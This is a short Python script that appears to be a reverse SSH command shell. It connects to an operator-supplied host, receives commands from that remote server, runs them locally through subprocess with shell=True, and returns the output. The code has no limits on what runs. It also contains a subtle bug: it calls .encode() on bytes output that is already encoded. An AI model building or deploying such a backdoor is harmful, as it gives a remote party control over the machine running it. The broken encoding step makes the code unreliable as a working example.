import paramiko
import subprocess
import shlex


#Supress warnings
import warnings
warnings.filterwarnings("ignore")


def ssh_cmd(ip, port, user, password, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, user, password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())

        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd = cmd.decode()
                if cmd == "exit":
                    client.close()
                    break
                output = subprocess.check_output(shlex.split(cmd), shell=True)
                if output:
                    ssh_session.send(output.encode())
                else:
                    print("No output")
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return


if __name__ == "__main__":
    import getpass
    user = input("Username: ")
    password = getpass.getpass()

    ip = input("IP: ")
    port = input("Port: ")
    ssh_cmd(ip, port, user, password, "ClientConnected")


